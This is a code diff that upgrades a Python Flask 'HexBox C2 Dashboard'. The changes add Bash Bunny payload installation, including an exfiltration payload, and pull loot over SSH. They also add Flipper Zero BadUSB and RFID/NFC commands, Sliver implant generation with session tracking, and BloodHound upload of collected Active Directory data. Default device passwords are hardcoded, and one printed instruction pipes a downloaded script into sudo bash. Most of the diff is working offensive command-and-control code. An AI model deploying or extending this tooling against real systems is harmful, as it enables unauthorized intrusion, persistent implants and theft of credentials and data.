@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
-# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 3)
+# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 4)
 
 from flask import (Flask, render_template_string, request, jsonify,
                    send_file, session, redirect, Response)
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import subprocess, paramiko, requests as _req, json, os, signal, sys
+import subprocess, paramiko, requests as _req, json, os, signal, sys, shutil
 import threading, shlex, socket, re, secrets, ipaddress, queue, time
 from datetime import datetime
 from pathlib import Path
@@ -29,7 +29,14 @@ DEVICES = _CFG.get("devices") or {
     "packetsquirrel": {"ip": "172.16.32.1",  "user": "root", "pass": "hak5squirrel"},
     "lanturtle":      {"ip": "172.16.84.1",  "user": "root", "pass": "hak5turtle"},
     "omgplug":        {"ip": "192.168.1.50", "user": "root", "pass": "hak5omg"},
+    "bashbunny":      {"ip": "172.16.64.1",  "user": "root", "pass": "hak5bunny"},
 }
+_BUNNY_CFG   = _CFG.get("bashbunny") or DEVICES.get("bashbunny",
+                   {"ip": "172.16.64.1", "user": "root", "pass": "hak5bunny"})
+_FLIPPER_CFG = _CFG.get("flipper", {"serial_port": "/dev/ttyACM0"})
+_BH_CFG      = _CFG.get("bloodhound", {"url": "http://localhost:8080",
+                                        "username": "admin", "password": "BloodHound!"})
+_SLIVER_CFG  = _CFG.get("sliver", {"host": "127.0.0.1", "port": 31337})
 
 LOOT     = Path(os.path.expanduser(_HB.get("loot_dir",  "~/hexbox/loot")))
 LOGS     = Path(os.path.expanduser(_HB.get("log_dir",   "~/hexbox/logs")))
@@ -40,7 +47,8 @@ SCAN_TARGET = _HB.get("scan_target", "192.168.1.0/24")
 IFACE_RESPONDER = _IF.get("responder", "eth0")
 IFACE_BETTERCAP = _IF.get("bettercap", "wlan0")
 
-for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports"):
+for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports",
+          LOOT / "bloodhound", LOOT / "implants", LOOT / "bunny"):
     d.mkdir(parents=True, exist_ok=True)
 
 # ---------------------------------------------------------------------------
@@ -49,7 +57,7 @@ for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports"):
 
 _TOKEN = os.environ.get("HEXBOX_TOKEN") or _HB.get("api_token") or secrets.token_hex(16)
 app.secret_key = secrets.token_hex(32)
-_VALID_PROCS = {"scan", "responder", "bettercap", "crack", "hashcat"}
+_VALID_PROCS = {"scan", "responder", "bettercap", "crack", "hashcat", "sliver"}
 
 
 @app.before_request
@@ -387,6 +395,20 @@ tr:hover td{background:#0d0d0d}
   <button onclick="run('/omg/payload/ad_recon')">AD Recon</button>
 </div>
 
+<div class="card"><h2>Bash Bunny<span class="dot" id="dot-bashbunny" title="unknown"></span></h2>
+  <button onclick="run('/bunny/recon')">Net Recon</button>
+  <button onclick="run('/bunny/loot')">Pull Loot</button><br>
+  <button onclick="installBunnyPayload(1)" class="warn">&#x2B07; Install Switch1</button>
+  <button onclick="installBunnyPayload(2)" class="warn">&#x2B07; Install Switch2</button>
+</div>
+
+<div class="card"><h2>Flipper Zero<span class="dot" id="dot-flipper" title="unknown"></span></h2>
+  <button onclick="flipperCmd('nfc')">NFC Detect</button>
+  <button onclick="flipperCmd('rfid')">RFID Read</button>
+  <button onclick="flipperCmd('subghz')">Sub-GHz RX</button>
+  <button onclick="flipperCmd('badusb')" class="warn">BadUSB Run</button>
+</div>
+
 <div class="card"><h2>Pi Local</h2>
   <button onclick="run('/pi/responder')">Start Responder</button>
   <button onclick="stopProc('responder')" class="kill">Stop</button><br>
@@ -414,6 +436,32 @@ tr:hover td{background:#0d0d0d}
     <span id="update-status" style="color:#555;font-size:.78em"></span>
   </div>
   <pre id="update-out" style="display:none;max-height:160px;margin-top:6px"></pre>
+</div>
+
+<div class="bar" style="margin-top:6px">
+  <h3>&#x1F5E1; Sliver C2</h3>
+  <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+    <span class="dot" id="dot-sliver" title="unknown"></span>
+    <button onclick="run('/sliver/start')">&#x25B6; Start Server</button>
+    <button onclick="stopProc('sliver')" class="kill">&#x25A0; Stop</button>
+    <button onclick="checkSliver()">&#x21BA; Status</button>
+    <button onclick="listSliverSessions()" class="dim">Sessions</button>
+    <span id="sliver-status" style="color:#555;font-size:.78em"></span>
+  </div>
+  <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
+    <label>OS:</label>
+    <select id="sl-os"><option>windows</option><option>linux</option><option>darwin</option></select>
+    <label>Arch:</label>
+    <select id="sl-arch"><option>amd64</option><option>386</option><option>arm64</option></select>
+    <label>Format:</label>
+    <select id="sl-fmt"><option>exe</option><option>shellcode</option><option>shared</option></select>
+    <label>Listener:</label>
+    <input id="sl-listener" value="http://{{hexbox_ip}}" style="width:180px">
+    <button onclick="generateImplant()" class="warn">&#x2692; Generate Implant</button>
+    <button onclick="listImplants()" class="dim">&#x1F4C2; List Implants</button>
+  </div>
+  <pre id="sliver-out" style="max-height:140px;margin-top:6px;display:none"></pre>
+  <div id="sliver-sessions" style="margin-top:4px"></div>
 </div>
 </div><!-- /pane-devices -->
 
@@ -443,6 +491,14 @@ tr:hover td{background:#0d0d0d}
 
 <div class="sec">&#x1F4BB; System Profiles</div>
 <div id="intel-sysinfo"><span style="color:#333">Click Refresh to load...</span></div>
+
+<div class="sec">&#x1F578; BloodHound Data</div>
+<div class="row" style="border:none;padding:4px 0;flex-wrap:wrap">
+  <button onclick="uploadToBH()" class="warn">&#x2B06; Upload to BloodHound</button>
+  <button onclick="refreshBH()" class="dim">&#x21BA; Refresh</button>
+  <span id="bh-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
+</div>
+<div id="intel-bloodhound"><span style="color:#333">Click Refresh to load BloodHound data...</span></div>
 </div><!-- /pane-intel -->
 
 <!-- ========================= PAYLOADS TAB ========================= -->
@@ -614,7 +670,7 @@ function showTab(name) {
     document.getElementById('pane-'+t).style.display = t===name ? '' : 'none';
     document.getElementById('btn-'+t).classList.toggle('active', t===name);
   });
-  if (name==='intel')    refreshIntel();
+  if (name==='intel')    { refreshIntel(); refreshBH(); }
   if (name==='loot')     refreshLoot();
   if (name==='logs')     tailLog();
   if (name==='payloads') loadPayloadList();
@@ -1025,6 +1081,119 @@ async function restartC2() {
   }
 }
 
+// ---- Bash Bunny ----
+async function installBunnyPayload(sw) {
+  out.textContent = '[*] Installing Bash Bunny payload to switch '+sw+'...';
+  try {
+    const r = await fetch('/bunny/payload/install', {method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({switch: sw})});
+    const j = await r.json();
+    out.textContent = j.output || j.error || '(no output)';
+    if (j.error) toast(j.error, 'err'); else toast('Payload installed to switch '+sw, 'warn');
+  } catch(e) { out.textContent='[ERR] '+e; }
+}
+
+// ---- Flipper Zero ----
+async function flipperCmd(cmd) {
+  out.textContent = '[*] Flipper: '+cmd+'...';
+  try {
+    const r = await fetch('/flipper/'+cmd, {method:'POST'});
+    const j = await r.json();
+    out.textContent = j.output || j.error || '(no output)';
+    if (j.error) toast(j.error, 'err');
+  } catch(e) { out.textContent='[ERR] '+e; }
+}
+
+// ---- Sliver C2 ----
+async function checkSliver() {
+  const dot = document.getElementById('dot-sliver');
+  const st  = document.getElementById('sliver-status');
+  dot.className = 'dot chk'; st.textContent = 'Checking...';
+  try {
+    const j = await (await fetch('/sliver/status')).json();
+    dot.className = 'dot ' + (j.running ? 'up' : 'dn');
+    st.textContent = j.running ? 'Running (pid='+j.pid+')' :
+                     (j.installed ? 'Installed — not running' : 'Not installed');
+    if (j.running) listSliverSessions();
+  } catch(e) { dot.className='dot dn'; st.textContent='[ERR] '+e; }
+}
+
+async function generateImplant() {
+  const body = {
+    os:       document.getElementById('sl-os').value,
+    arch:     document.getElementById('sl-arch').value,
+    format:   document.getElementById('sl-fmt').value,
+    listener: document.getElementById('sl-listener').value,
+  };
+  const pre = document.getElementById('sliver-out');
+  pre.style.display = ''; pre.textContent = 'Generating implant — this may take 60s...';
+  try {
+    const r = await fetch('/sliver/generate', {method:'POST',
+      headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)});
+    const j = await r.json();
+    pre.textContent = j.output || j.error || '(no output)';
+    if (j.implant) { toast('Implant ready: '+j.implant, 'warn'); listImplants(); }
+    else if (j.error) toast(j.error, 'err');
+  } catch(e) { pre.textContent='[ERR] '+e; }
+}
+
+async function listSliverSessions() {
+  try {
+    const j = await (await fetch('/sliver/sessions')).json();
+    const el = document.getElementById('sliver-sessions');
+    if (!j.sessions?.length) { el.innerHTML='<span style="color:#333;font-size:.78em">No active sessions</span>'; return; }
+    el.innerHTML = '<table><tr><th>ID</th><th>Name</th><th>Host</th><th>OS</th><th>Arch</th><th>Last Seen</th></tr>' +
+      j.sessions.map(s =>
+        '<tr><td>'+esc(s.id)+'</td><td style="color:#0f0">'+esc(s.name)+'</td>' +
+        '<td>'+esc(s.hostname)+'</td><td>'+esc(s.os)+'</td>' +
+        '<td>'+esc(s.arch)+'</td><td style="color:#555">'+esc(s.last_seen)+'</td></tr>'
+      ).join('') + '</table>';
+  } catch(_) {}
+}
+
+async function listImplants() {
+  const pre = document.getElementById('sliver-out');
+  pre.style.display = ''; pre.textContent = 'Loading implants...';
+  try {
+    const j = await (await fetch('/sliver/implants')).json();
+    if (!j.implants?.length) { pre.textContent='No implants generated yet.'; return; }
+    pre.textContent = j.implants.map(i =>
+      i.name + '  ' + i.os + '/' + i.arch + '  ' + (i.size_kb||'?') + ' KB  ' + i.mtime
+    ).join('\n');
+  } catch(e) { pre.textContent='[ERR] '+e; }
+}
+
+// ---- BloodHound ----
+async function uploadToBH() {
+  const st = document.getElementById('bh-status');
+  st.textContent = 'Uploading to BloodHound...';
+  try {
+    const r = await fetch('/bloodhound/upload', {method:'POST'});
+    const j = await r.json();
+    st.textContent = j.output || j.error || '';
+    if (j.error) toast(j.error, 'err'); else { toast('BloodHound upload complete'); refreshBH(); }
+  } catch(e) { st.textContent='[ERR] '+e; }
+}
+
+async function refreshBH() {
+  const el = document.getElementById('intel-bloodhound');
+  const st = document.getElementById('bh-status');
+  try {
+    const j = await (await fetch('/bloodhound/status')).json();
+    if (j.error) { st.textContent=j.error; return; }
+    st.textContent = j.files + ' file(s), ' + j.total_objects + ' objects collected';
+    if (!j.summary?.length) {
+      el.innerHTML='<span style="color:#333">No BloodHound data — run bloodhound_collect.ducky first</span>'; return;
+    }
+    el.innerHTML = '<table><tr><th>Type</th><th>Objects</th><th>Domain</th><th>Captured</th></tr>' +
+      j.summary.map(s =>
+        '<tr><td><b>'+esc(s.type)+'</b></td><td style="color:#0f0">'+s.count+'</td>' +
+        '<td>'+esc(s.domain)+'</td><td style="color:#555">'+esc(s.captured)+'</td></tr>'
+      ).join('') + '</table>';
+  } catch(e) { el.innerHTML='[ERR] '+e; }
+}
+
 // ---- Utilities ----
 function esc(s) {
   return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;')
@@ -1044,6 +1213,7 @@ initSSE();
 checkStatus();
 refreshProcs();
 loadActiveEngagement();
+checkSliver();
 setInterval(refreshProcs, 20000);
 </script>
 </body></html>"""
@@ -1136,7 +1306,7 @@ def events_stream():
 @app.route("/status")
 def status():
     def _check(dev_name, info):
-        ip, up = info["ip"], False
+        ip, up = info.get("ip", ""), False
         for port in (22, 80, info.get("api_port", 0)):
             if not port:
                 continue
@@ -1149,12 +1319,22 @@ def status():
                 pass
         return dev_name, {"ip": ip, "up": up}
 
+    all_devices = dict(DEVICES)
+    # Bash Bunny already in DEVICES; add it only if separately configured
+    if _BUNNY_CFG.get("ip") and "bashbunny" not in all_devices:
+        all_devices["bashbunny"] = _BUNNY_CFG
+
     result = {}
-    with ThreadPoolExecutor(max_workers=len(DEVICES)) as ex:
-        futures = {ex.submit(_check, dev, info): dev for dev, info in DEVICES.items()}
+    with ThreadPoolExecutor(max_workers=max(len(all_devices), 1)) as ex:
+        futures = {ex.submit(_check, dev, info): dev for dev, info in all_devices.items()}
         for fut in as_completed(futures):
             name, res = fut.result()
             result[name] = res
+
+    # Flipper Zero: check serial port presence (no TCP)
+    fp = _FLIPPER_CFG.get("serial_port", "/dev/ttyACM0")
+    result["flipper"] = {"ip": fp, "up": Path(fp).exists()}
+
     return jsonify(result)
 
 
@@ -1717,6 +1897,434 @@ def pi_hashcat():
     return jsonify(output=f"Hashcat started (pid={pid}) — {len(hashes)} hash(es) → loot/cracked.txt")
 
 # ---------------------------------------------------------------------------
+# Routes — Bash Bunny
+# ---------------------------------------------------------------------------
+
+def _bunny_ssh(cmd: str) -> str:
+    d = _BUNNY_CFG
+    c = paramiko.SSHClient()
+    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=10)
+        _, out, err = c.exec_command(cmd)
+        return out.read().decode() + err.read().decode()
+    except Exception as e:
+        return f"[ERR] {e}"
+    finally:
+        c.close()
+
+
+@app.route("/bunny/status")
+def bunny_status():
+    out = _bunny_ssh("uptime && cat /etc/bunny_version 2>/dev/null || echo 'Bash Bunny'")
+    return jsonify(output=out, up=not out.startswith("[ERR]"))
+
+
+@app.route("/bunny/recon", methods=["POST"])
+def bunny_recon():
+    out = _bunny_ssh(
+        "GW=$(ip route | awk '/default/{print $3; exit}');"
+        "SUBNET=${GW%.*}.0/24;"
+        "arp-scan --localnet 2>&1 | head -40 || nmap -sn \"$SUBNET\" 2>&1 | head -40"
+    )
+    _log(f"Bash Bunny recon: {len(out)} bytes")
+    return jsonify(output=out or "No output — check Bash Bunny connectivity")
+
+
+@app.route("/bunny/loot", methods=["POST"])
+def bunny_loot():
+    dest = LOOT / "bunny"
+    for remote in ("/tmp/bb_recon", "/root/loot"):
+        try:
+            d = _BUNNY_CFG
+            c = paramiko.SSHClient()
+            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
+            sftp = c.open_sftp()
+            entries = sftp.listdir(remote)
+            dest.mkdir(parents=True, exist_ok=True)
+            count = 0
+            for name in entries:
+                try:
+                    sftp.get(f"{remote}/{name}", str(dest / name))
+                    count += 1
+                except Exception:
+                    pass
+            sftp.close()
+            c.close()
+            if count:
+                _log(f"Bash Bunny loot: {count} file(s) from {remote}")
+                return jsonify(output=f"Pulled {count} file(s) from {remote} → loot/bunny/")
+        except Exception:
+            pass
+    return jsonify(output="[ERR] No loot directories found on Bash Bunny (run a recon first)")
+
+
+@app.route("/bunny/payload/install", methods=["POST"])
+def bunny_install():
+    data   = request.get_json(silent=True) or {}
+    switch = int(data.get("switch", 1))
+    if switch not in (1, 2):
+        return jsonify(error="switch must be 1 or 2"), 400
+    src_map = {1: "bunny_recon.sh", 2: "bunny_exfil.sh"}
+    src = PAYLOADS / src_map[switch]
+    if not src.exists():
+        return jsonify(error=f"Payload {src.name} not found in payloads/"), 404
+    dest_path = f"/root/udisk/payloads/switch{switch}/payload.sh"
+    try:
+        d = _BUNNY_CFG
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
+        sftp = c.open_sftp()
+        sftp.put(str(src), dest_path)
+        c.exec_command(f"chmod +x {dest_path}")
+        sftp.close()
+        c.close()
+        _log(f"Bash Bunny switch{switch} payload installed")
+        return jsonify(output=f"Installed {src.name} → {dest_path}")
+    except Exception as e:
+        return jsonify(error=str(e)), 500
+
+# ---------------------------------------------------------------------------
+# Routes — Flipper Zero serial bridge
+# ---------------------------------------------------------------------------
+
+def _flipper_cmd(cmd: str, read_timeout: float = 6.0) -> str:
+    port = _FLIPPER_CFG.get("serial_port", "/dev/ttyACM0")
+    if not Path(port).exists():
+        return f"[ERR] Serial port {port} not found — is Flipper Zero connected?"
+    try:
+        import serial
+    except ImportError:
+        return "[ERR] pyserial not installed — run: pip install pyserial"
+    try:
+        with serial.Serial(port, 230400, timeout=1.0) as ser:
+            ser.reset_input_buffer()
+            ser.write(f"\r{cmd}\r\n".encode())
+            ser.flush()
+            resp = b""
+            deadline = time.time() + read_timeout
+            while time.time() < deadline:
+                chunk = ser.read(ser.in_waiting or 1)
+                if chunk:
+                    resp += chunk
+                    if b">: " in resp or b"error" in resp.lower():
+                        break
+                else:
+                    time.sleep(0.05)
+            return resp.decode(errors="replace").strip()
+    except Exception as e:
+        return f"[ERR] {e}"
+
+
+@app.route("/flipper/status")
+def flipper_status():
+    port = _FLIPPER_CFG.get("serial_port", "/dev/ttyACM0")
+    up   = Path(port).exists()
+    return jsonify(port=port, up=up,
+                   output=f"Flipper Zero: {'connected' if up else 'not found'} at {port}")
+
+
+@app.route("/flipper/nfc", methods=["POST"])
+def flipper_nfc():
+    out = _flipper_cmd("nfc detect")
+    _log(f"Flipper NFC: {out[:80]}")
+    return jsonify(output=out)
+
+
+@app.route("/flipper/rfid", methods=["POST"])
+def flipper_rfid():
+    out = _flipper_cmd("rfid read")
+    _log(f"Flipper RFID: {out[:80]}")
+    return jsonify(output=out)
+
+
+@app.route("/flipper/badusb", methods=["POST"])
+def flipper_badusb():
+    out = _flipper_cmd("badusb run /ext/badusb/payload.txt", read_timeout=15.0)
+    _log(f"Flipper BadUSB: {out[:80]}")
+    return jsonify(output=out)
+
+
+@app.route("/flipper/subghz", methods=["POST"])
+def flipper_subghz():
+    out = _flipper_cmd("subghz rx 433920000 --timeout 30", read_timeout=35.0)
+    _log(f"Flipper Sub-GHz: {out[:80]}")
+    return jsonify(output=out)
+
+# ---------------------------------------------------------------------------
+# Routes — Sliver C2 implant generation
+# ---------------------------------------------------------------------------
+
+_SLIVER_DIR     = Path.home() / ".sliver"
+_SLIVER_OP_CFG  = _SLIVER_DIR / "hexbox-operator.cfg"
+_SLIVER_IMPLANTS = LOOT / "implants"
+
+
+def _sliver_installed() -> bool:
+    return bool(shutil.which("sliver-server"))
+
+
+def _ensure_sliver_operator() -> tuple[bool, str]:
+    if _SLIVER_OP_CFG.exists():
+        return True, str(_SLIVER_OP_CFG)
+    if not _sliver_installed():
+        return False, "sliver-server not installed (apt install sliver / see sliver docs)"
+    _SLIVER_DIR.mkdir(parents=True, exist_ok=True)
+    result = subprocess.run(
+        ["sliver-server", "operator",
+         "--name", "hexbox",
+         "--lhost", "127.0.0.1",
+         "--lport", str(_SLIVER_CFG.get("port", 31337)),
+         "--save", str(_SLIVER_OP_CFG)],
+        capture_output=True, text=True, timeout=30,
+    )
+    if result.returncode != 0 or not _SLIVER_OP_CFG.exists():
+        return False, result.stderr.strip() or "Failed to create operator config"
+    return True, str(_SLIVER_OP_CFG)
+
+
+def _sliver_client_cmd(cmd: str, timeout: int = 90) -> str:
+    ok, cfg_or_err = _ensure_sliver_operator()
+    if not ok:
+        return f"[ERR] {cfg_or_err}"
+    client = shutil.which("sliver-client")
+    if not client:
+        return "[ERR] sliver-client not installed"
+    try:
+        proc = subprocess.run(
+            [client, "--config", str(_SLIVER_OP_CFG)],
+            input=f"{cmd}\nexit\n",
+            capture_output=True, text=True, timeout=timeout,
+        )
+        return (proc.stdout + proc.stderr).strip()
+    except subprocess.TimeoutExpired:
+        return "[ERR] Command timed out"
+    except Exception as e:
+        return f"[ERR] {e}"
+
+
+@app.route("/sliver/status")
+def sliver_status():
+    installed = _sliver_installed()
+    pid = None
+    running = False
+    with _procs_lock:
+        p = _procs.get("sliver")
+        if p and p.poll() is None:
+            running = True
+            pid = p.pid
+    if not running:
+        try:
+            r = subprocess.run(["pgrep", "-x", "sliver-server"],
+                               capture_output=True, text=True, timeout=3)
+            if r.returncode == 0 and r.stdout.strip():
+                running = True
+                pid = int(r.stdout.strip().splitlines()[0])
+        except Exception:
+            pass
+    return jsonify(installed=installed, running=running, pid=pid)
+
+
+@app.route("/sliver/start", methods=["POST"])
+def sliver_start():
+    if not _sliver_installed():
+        return jsonify(error="sliver-server not installed"), 400
+    host = _SLIVER_CFG.get("host", "127.0.0.1")
+    port = _SLIVER_CFG.get("port", 31337)
+    pid = start_proc("sliver", [
+        "sliver-server", "daemon",
+        "--lhost", host, "--lport", str(port),
+    ])
+    _log(f"Sliver server started (pid={pid})")
+    return jsonify(output=f"Sliver server started (pid={pid}) — listening on {host}:{port}")
+
+
+@app.route("/sliver/generate", methods=["POST"])
+def sliver_generate():
+    data     = request.get_json(silent=True) or {}
+    os_name  = data.get("os", "windows")
+    arch     = data.get("arch", "amd64")
+    fmt      = data.get("format", "exe")
+    listener = data.get("listener", f"http://{HEXBOX_IP}")
+
+    if os_name not in ("windows", "linux", "darwin"):
+        return jsonify(error="invalid os"), 400
+    if arch not in ("amd64", "386", "arm64"):
+        return jsonify(error="invalid arch"), 400
+    if fmt not in ("exe", "shellcode", "shared", "service"):
+        return jsonify(error="invalid format"), 400
+
+    _SLIVER_IMPLANTS.mkdir(parents=True, exist_ok=True)
+    cmd = (f"generate --{fmt.replace('exe','exe')} "
+           f"--os {os_name} --arch {arch} "
+           f"--http {listener} "
+           f"--save {_SLIVER_IMPLANTS}")
+
+    if not _sliver_installed():
+        return jsonify(
+            output=f"[INFO] sliver-server not installed.\n"
+                   f"Install: curl https://sliver.sh/install|sudo bash\n"
+                   f"Then run implant generation manually:\n  sliver-client\n  > {cmd}",
+            implant=None,
+        )
+
+    output = _sliver_client_cmd(cmd, timeout=120)
+    # Find newly generated implant
+    new_implant = None
+    for f in sorted(_SLIVER_IMPLANTS.iterdir(), key=lambda x: x.stat().st_mtime, reverse=True):
+        if f.is_file():
+            new_implant = f.name
+            break
+
+    _log(f"Sliver generate {os_name}/{arch}/{fmt}: {new_implant or 'failed'}")
+    return jsonify(output=output, implant=new_implant)
+
+
+@app.route("/sliver/sessions")
+def sliver_sessions():
+    if not _sliver_installed():
+        return jsonify(sessions=[])
+    output = _sliver_client_cmd("sessions", timeout=15)
+    sessions: list[dict] = []
+    for line in output.splitlines():
+        # Parse sliver sessions table: ID  Name  Transport  Host  Port  User  OS/Arch  Last Active
+        parts = line.split()
+        if len(parts) >= 6 and re.match(r'[0-9a-f]{8}', parts[0]):
+            sessions.append({
+                "id":       parts[0],
+                "name":     parts[1] if len(parts) > 1 else "?",
+                "hostname": parts[3] if len(parts) > 3 else "?",
+                "os":       parts[6].split("/")[0] if len(parts) > 6 else "?",
+                "arch":     parts[6].split("/")[1] if len(parts) > 6 and "/" in parts[6] else "?",
+                "last_seen": parts[-1] if parts else "?",
+            })
+    return jsonify(sessions=sessions)
+
+
+@app.route("/sliver/implants")
+def sliver_implant_list():
+    implants = []
+    if _SLIVER_IMPLANTS.exists():
+        for f in sorted(_SLIVER_IMPLANTS.iterdir(), key=lambda x: x.stat().st_mtime, reverse=True):
+            if f.is_file():
+                st = f.stat()
+                implants.append({
+                    "name":    f.name,
+                    "size_kb": round(st.st_size / 1024, 1),
+                    "mtime":   datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
+                })
+    return jsonify(implants=implants)
+
+
+@app.route("/sliver/download")
+def sliver_download():
+    name = _safe_name(request.args.get("name", ""))
+    if not name:
+        return "name required", 400
+    path = _SLIVER_IMPLANTS / name
+    if not path.is_file():
+        return "Not found", 404
+    return send_file(str(path), as_attachment=True, download_name=name)
+
+# ---------------------------------------------------------------------------
+# Routes — BloodHound auto-ingestion
+# ---------------------------------------------------------------------------
+
+def _safe_name(value: str, maxlen: int = 64) -> str:
+    return re.sub(r"[^a-zA-Z0-9_.-]", "_", Path(value).name)[:maxlen] or "unk"
+
+
+@app.route("/bloodhound/status")
+def bh_status():
+    try:
+        from parse_loot import aggregate_bloodhound
+    except ImportError:
+        import sys as _sys
+        _sys.path.insert(0, str(Path(__file__).parent))
+        from parse_loot import aggregate_bloodhound
+    return jsonify(**aggregate_bloodhound(LOOT))
+
+
+@app.route("/bloodhound/upload", methods=["POST"])
+def bh_upload():
+    """Upload collected BloodHound JSON files to BloodHound CE via REST API."""
+    bh_dir = LOOT / "bloodhound"
+    if not bh_dir.exists() or not any(bh_dir.glob("*.json")):
+        return jsonify(error="No BloodHound JSON files found — run bloodhound_collect.ducky first"), 400
+
+    url      = _BH_CFG.get("url", "http://localhost:8080")
+    username = _BH_CFG.get("username", "admin")
+    password = _BH_CFG.get("password", "BloodHound!")
+
+    # Authenticate
+    try:
+        auth_r = _req.post(
+            f"{url}/api/v2/login",
+            json={"login_method": "secret", "username": username, "secret": password},
+            timeout=10,
+        )
+        if auth_r.status_code not in (200, 201):
+            return jsonify(error=f"BloodHound auth failed: {auth_r.status_code} {auth_r.text[:200]}"), 502
+        jwt = auth_r.json().get("data", {}).get("access_token") or auth_r.json().get("access_token")
+        if not jwt:
+            return jsonify(error="No access token in BloodHound response"), 502
+    except Exception as e:
+        return jsonify(error=f"Cannot reach BloodHound at {url}: {e}"), 502
+
+    headers = {"Authorization": f"Bearer {jwt}"}
+    uploaded = 0
+    errors   = []
+
+    for jf in sorted(bh_dir.glob("*.json")):
+        try:
+            # Start upload session
+            start_r = _req.post(f"{url}/api/v2/file-upload/start",
+                                 headers=headers, timeout=10)
+            upload_id = (start_r.json().get("data", {}).get("id") or
+                         start_r.json().get("id"))
+            if not upload_id:
+                errors.append(f"{jf.name}: no upload_id")
+                continue
+
+            # Upload file
+            content = jf.read_bytes()
+            up_r = _req.post(
+                f"{url}/api/v2/file-upload/{upload_id}",
+                data=content,
+                headers={**headers, "Content-Type": "application/json"},
+                timeout=60,
+            )
+            if up_r.status_code not in (200, 201, 204):
+                errors.append(f"{jf.name}: upload {up_r.status_code}")
+                continue
+
+            # Finalize
+            _req.post(f"{url}/api/v2/file-upload/{upload_id}/end",
+                      headers=headers, timeout=10)
+            uploaded += 1
+        except Exception as e:
+            errors.append(f"{jf.name}: {e}")
+
+    msg = f"Uploaded {uploaded} file(s) to BloodHound"
+    if errors:
+        msg += f" ({len(errors)} error(s): {'; '.join(errors[:3])})"
+    _log(msg)
+    return jsonify(output=msg, uploaded=uploaded, errors=errors)
+
+
+@app.route("/bloodhound/download")
+def bh_download():
+    name = _safe_name(request.args.get("name", ""))
+    if not name:
+        return "name required", 400
+    path = LOOT / "bloodhound" / name
+    if not path.is_file():
+        return "Not found", 404
+    return send_file(str(path), as_attachment=True, download_name=name)
+
+# ---------------------------------------------------------------------------
 # Software update + restart
 # ---------------------------------------------------------------------------
 
@@ -1791,7 +2399,7 @@ if __name__ == "__main__":
         t = threading.Thread(target=_loot_watcher, daemon=True)
         t.start()
 
-    print(f"[+] HexBox C2 (Phase 3) online → http://0.0.0.0:{PORT}")
+    print(f"[+] HexBox C2 (Phase 4) online → http://0.0.0.0:{PORT}")
     if not os.environ.get("HEXBOX_TOKEN") and not _HB.get("api_token"):
         print(f"[!] Access token (set HEXBOX_TOKEN env var to pin): {_TOKEN}")
     print(f"[!] SSH host-key verification is DISABLED (AutoAddPolicy) — see README for hardening")
